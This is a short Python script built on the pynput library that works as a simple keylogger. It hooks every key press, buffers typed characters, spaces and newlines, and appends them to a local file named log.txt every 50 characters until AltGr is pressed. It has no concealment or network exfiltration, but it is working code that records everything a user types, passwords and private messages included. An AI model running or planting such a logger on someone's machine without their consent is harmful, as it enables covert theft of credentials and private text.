from pynput import mouse, keyboard

buffer = ""

def on_press(key):
    global buffer
    if key == keyboard.Key.alt_gr:
        return False

    try:
        buffer += key.char
    except AttributeError:
        if key == keyboard.Key.space:
            buffer += " "
        elif key == keyboard.Key.enter:
            buffer += "\n"
  

    print(len(buffer))
     
    if len(buffer) >= 50:
        with open("log.txt", "a") as log:
            log.write(buffer)
            buffer = ""

def on_release(key):
    pass

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

